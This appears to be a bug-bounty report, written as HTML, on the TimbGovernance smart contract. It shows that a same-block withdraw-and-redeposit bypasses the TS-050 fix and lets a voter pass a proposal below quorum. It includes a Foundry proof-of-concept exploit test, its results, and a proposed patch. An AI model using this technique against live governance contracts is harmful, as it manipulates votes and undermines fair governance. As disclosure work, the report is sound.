@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>TimbSwap report 2</title>
+  <style>
+    html {
+      color: #1a1a1a;
+      background-color: #fdfdfd;
+    }
+    body {
+      margin: 0 auto;
+      max-width: 36em;
+      padding-left: 50px;
+      padding-right: 50px;
+      padding-top: 50px;
+      padding-bottom: 50px;
+      hyphens: auto;
+      overflow-wrap: break-word;
+      text-rendering: optimizeLegibility;
+      font-kerning: normal;
+    }
+    @media (max-width: 600px) {
+      body {
+        font-size: 0.9em;
+        padding: 12px;
+      }
+      h1 {
+        font-size: 1.8em;
+      }
+    }
+    @media print {
+      html {
+        background-color: white;
+      }
+      body {
+        background-color: transparent;
+        color: black;
+        font-size: 12pt;
+      }
+      p, h2, h3 {
+        orphans: 3;
+        widows: 3;
+      }
+      h2, h3, h4 {
+        page-break-after: avoid;
+      }
+    }
+    p {
+      margin: 1em 0;
+    }
+    a {
+      color: #1a1a1a;
+    }
+    a:visited {
+      color: #1a1a1a;
+    }
+    img {
+      max-width: 100%;
+    }
+    svg {
+      height: auto;
+      max-width: 100%;
+    }
+    h1, h2, h3, h4, h5, h6 {
+      margin-top: 1.4em;
+    }
+    h5, h6 {
+      font-size: 1em;
+      font-style: italic;
+    }
+    h6 {
+      font-weight: normal;
+    }
+    ol, ul {
+      padding-left: 1.7em;
+      margin-top: 1em;
+    }
+    li > ol, li > ul {
+      margin-top: 0;
+    }
+    blockquote {
+      margin: 1em 0 1em 1.7em;
+      padding-left: 1em;
+      border-left: 2px solid #e6e6e6;
+      color: #606060;
+    }
+    code {
+      font-family: Menlo, Monaco, Consolas, 'Lucida Console', monospace;
+      font-size: 85%;
+      margin: 0;
+      hyphens: manual;
+    }
+    pre {
+      margin: 1em 0;
+      overflow: auto;
+    }
+    pre code {
+      padding: 0;
+      overflow: visible;
+      overflow-wrap: normal;
+    }
+    .sourceCode {
+     background-color: transparent;
+     overflow: visible;
+    }
+    hr {
+      background-color: #1a1a1a;
+      border: none;
+      height: 1px;
+      margin: 1em 0;
+    }
+    table {
+      margin: 1em 0;
+      border-collapse: collapse;
+      width: 100%;
+      overflow-x: auto;
+      display: block;
+      font-variant-numeric: lining-nums tabular-nums;
+    }
+    table caption {
+      margin-bottom: 0.75em;
+    }
+    tbody {
+      margin-top: 0.5em;
+      border-top: 1px solid #1a1a1a;
+      border-bottom: 1px solid #1a1a1a;
+    }
+    th {
+      border-top: 1px solid #1a1a1a;
+      padding: 0.25em 0.5em 0.25em 0.5em;
+    }
+    td {
+      padding: 0.125em 0.5em 0.25em 0.5em;
+    }
+    header {
+      margin-bottom: 4em;
+      text-align: center;
+    }
+    #TOC li {
+      list-style: none;
+    }
+    #TOC ul {
+      padding-left: 1.3em;
+    }
+    #TOC > ul {
+      padding-left: 0;
+    }
+    #TOC a:not(:hover) {
+      text-decoration: none;
+    }
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    div.columns{display: flex; gap: min(4vw, 1.5em);}
+    div.column{flex: auto; overflow-x: auto;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    /* The extra [class] is a hack that increases specificity enough to
+       override a similar rule in reveal.js */
+    ul.task-list[class]{list-style: none;}
+    ul.task-list li input[type="checkbox"] {
+      font-size: inherit;
+      width: 0.8em;
+      margin: 0 0.8em 0.2em -1.6em;
+      vertical-align: middle;
+    }
+    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
+  </style>
+</head>
+<body>
+<header id="title-block-header">
+<h1 class="title">TimbGovernance: the TS-050 fix is bypassed by a
+withdraw and redeposit round trip, so withdrawn power still leaves the
+quorum base and still votes</h1>
+</header>
+<h1
+id="timbgovernance-the-ts-050-fix-is-bypassed-by-a-withdraw-and-redeposit-round-trip-so-withdrawn-power-still-leaves-the-quorum-base-and-still-votes">TimbGovernance:
+the TS-050 fix is bypassed by a withdraw and redeposit round trip, so
+withdrawn power still leaves the quorum base and still votes</h1>
+<p><strong>Reporter:</strong> Ramprasad Edigi (Ram)
+<strong>Contract:</strong> <code>TimbGovernance</code> (mainnet source,
+<code>contracts/TimbGovernance.sol</code>,
+github.com/0xTimberZx/TimbSwap, main at commit <code>699a768</code>,
+which includes the TS-050 fix from #177) <strong>Suggested
+tier:</strong> T3, off-chain-signalling governance manipulation
+(voting-power / quorum bypass), per the SECURITY.md table
+<strong>Relation to known issues:</strong> fix review of TS-050 (and of
+the TS-021 / TS-034 pair it sits between). The TS-050 fix closes the
+“withdraw and sell” path but not the “withdraw and put it back” path.
+The root cause that TS-050 described is still reachable.</p>
+<h2 id="summary">Summary</h2>
+<p>TS-050 changed <code>castVote</code> to count
+<code>min(votingPowerAt(voter, createdAt), votingPowerDeposited[voter])</code>.
+That stops a voter who withdrew and kept the tokens out.</p>
+<p>It does not stop a voter who withdraws and then deposits the same
+amount again:</p>
+<ol type="1">
+<li>After a proposal is created, the holder calls
+<code>withdrawVotingPower(x)</code>. TS-021 ratchets the proposal’s
+<code>totalVotingPower</code> (the quorum base) down by
+<code>x</code>.</li>
+<li>In the same block, the holder calls
+<code>depositVotingPower(x)</code>. The live total goes back up, but the
+base never rises again, by design.</li>
+<li>At vote time, the snapshot is still <code>x</code> and
+<code>held</code> is <code>x</code> again, so the vote counts
+<code>x</code>.</li>
+</ol>
+<p>The same <code>x</code> is out of the denominator and in the
+numerator. No tokens need to be sold or borrowed, the round trip costs
+two transactions of gas, and the vote lock then covers the redeposited
+balance, so the voter loses nothing.</p>
+<h2 id="root-cause">Root cause</h2>
+<pre class="solidity"><code>// withdrawVotingPower
+votingPowerDeposited[voter] -= amount;
+totalVotingPower -= amount;
+_checkpoint(voter);
+_sweepOpenProposals(true);              // base := min(base, live total)
+
+// castVote (after TS-050)
+uint256 power = votingPowerAt(msg.sender, p.createdAt);   // snapshot at creation
+uint256 held  = votingPowerDeposited[msg.sender];         // balance NOW
+if (held &lt; power) power = held;</code></pre>
+<p><code>held</code> is read at vote time only. The ratchet is driven by
+the lowest balance during the voting window. A balance that dipped and
+came back passes the <code>held</code> check, so the two sides still
+disagree about whether that power is “in” the proposal.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Quorum bypass.</strong> With the repo’s own test parameters
+(4% quorum), a proposal backed only by a holder of 3.9% of creation
+power passes after one round trip. Without the round trip the same vote
+fails quorum.</li>
+<li><strong>Votes far above the base.</strong> If nine of ten equal
+holders round-trip, the base falls to 10e18 while 90e18 is counted FOR,
+nine times the base, with every voter fully deposited.</li>
+<li><strong>No cost, no risk.</strong> Unlike TS-050, the attacker never
+gives up the tokens, so the M6 lock does not deter it.</li>
+</ul>
+<p>Governance is signalling-only during the beta and execution is
+owner-gated, so no funds move. That is why this is filed at T3, the tier
+the program names for voting-power and quorum bypass.</p>
+<h2 id="proof-of-concept">Proof of concept</h2>
+<p>Foundry tests against an unmodified copy of
+<code>contracts/TimbGovernance.sol</code> from main
+<code>699a768</code>, with the constructor parameters from
+<code>tests/TimbGovernance.t.sol</code> (threshold 1,000e18, quorum 400
+bps, 3 day period, 1 day delay). Local only, no network
+transactions.</p>
+<p><code>test/GovRoundTripBypass.t.sol</code>:</p>
+<pre class="solidity"><code>function test_exploit_roundTrip_passesBelowQuorum() public {
+    _deposit(honest, 95e18);
+    _deposit(attacker, 3.9e18);
+    _deposit(passive, 1.1e18);
+    uint256 pid = gov.createProposal(&quot;p&quot;, &quot;d&quot;);     // base 100e18, quorum 4e18
+
+    vm.warp(block.timestamp + 1 hours);
+    vm.startPrank(attacker);
+    gov.withdrawVotingPower(3.9e18);                 // base ratchets to 96.1e18
+    timbs.approve(address(gov), 3.9e18);
+    gov.depositVotingPower(3.9e18);                  // held back to 3.9e18
+    vm.stopPrank();
+
+    vm.warp(block.timestamp + VOTING_DELAY + 1);
+    vm.prank(attacker);
+    gov.castVote(pid, true);                         // counts 3.9e18 &gt;= 3.844e18
+
+    vm.warp(block.timestamp + VOTING_PERIOD + 1);
+    gov.executeProposal(pid);                        // Passed -&gt; Executed
+}</code></pre>
+<p>The file also has:</p>
+<ul>
+<li><code>test_baseline_noRoundTrip_failsQuorum</code>: the same voter
+without the round trip fails quorum.</li>
+<li><code>test_exploit_votesExceedBase</code>: 90e18 FOR against a base
+of 10e18, all voters fully deposited.</li>
+</ul>
+<p>Result:</p>
+<pre><code>[PASS] test_baseline_noRoundTrip_failsQuorum()
+[PASS] test_exploit_roundTrip_passesBelowQuorum()
+[PASS] test_exploit_votesExceedBase()
+Suite result: ok. 3 passed; 0 failed</code></pre>
+<p>Run:
+<code>FOUNDRY_SPARSE_MODE=true forge test --match-path test/GovRoundTripBypass.t.sol -vv</code>
+(solc 0.8.24, via_ir, optimizer 200, cancun, as in the repo
+foundry.toml).</p>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Record, per open proposal, how much each voter withdrew while it was
+open, and subtract it from the snapshot at vote time. The withdraw path
+already walks the open list (at most 16 entries), so this stays
+bounded:</p>
+<pre class="solidity"><code>mapping(uint256 =&gt; mapping(address =&gt; uint256)) public withdrawnDuring;
+
+// withdrawVotingPower, after _sweepOpenProposals(true):
+for (uint256 i = 0; i &lt; _openProposals.length; i++) {
+    withdrawnDuring[_openProposals[i]][voter] += amount;
+}
+
+// castVote:
+uint256 power = votingPowerAt(msg.sender, p.createdAt);
+uint256 gone  = withdrawnDuring[proposalId][msg.sender];
+power = power &gt; gone ? power - gone : 0;
+uint256 held  = votingPowerDeposited[msg.sender];
+if (held &lt; power) power = held;</code></pre>
+<p>Power that left a proposal’s base can then never count in that
+proposal’s votes, whatever happens to the balance afterwards. Reading
+the minimum over checkpoints is not enough on its own, because
+same-second checkpoints overwrite each other and a same-block round trip
+leaves no dip in the history.</p>
+<p><code>test/GovRoundTripFix.t.sol</code> applies exactly this change
+(<code>src/TimbGovernanceFixed.sol</code>). All four tests pass:</p>
+<ul>
+<li>a full round trip can no longer vote
+(<code>InsufficientVotingPower</code>)</li>
+<li>a partial round trip (10 deposited, 6 out and back) counts 4</li>
+<li>an honest holder still votes their full snapshot</li>
+<li>a withdrawal made before the proposal existed is not penalised</li>
+</ul>
+<h2 id="deployed-contract">Deployed contract</h2>
+<p>Source only. The testnet program states no governance module is live
+on testnet. The listed Arbitrum One governance address
+(<code>0x26d1e27132d1d5cdb449d641938c7da26cd5be63</code>) runs an older
+build without the TS-021 ratchet (checked earlier with a read-only
+<code>eth_getCode</code>: no <code>openProposalCount()</code> selector),
+so it does not have this exact path. The issue is in the current mainnet
+source on main, which is the build the program judges findings
+against.</p>
+</body>
+</html>
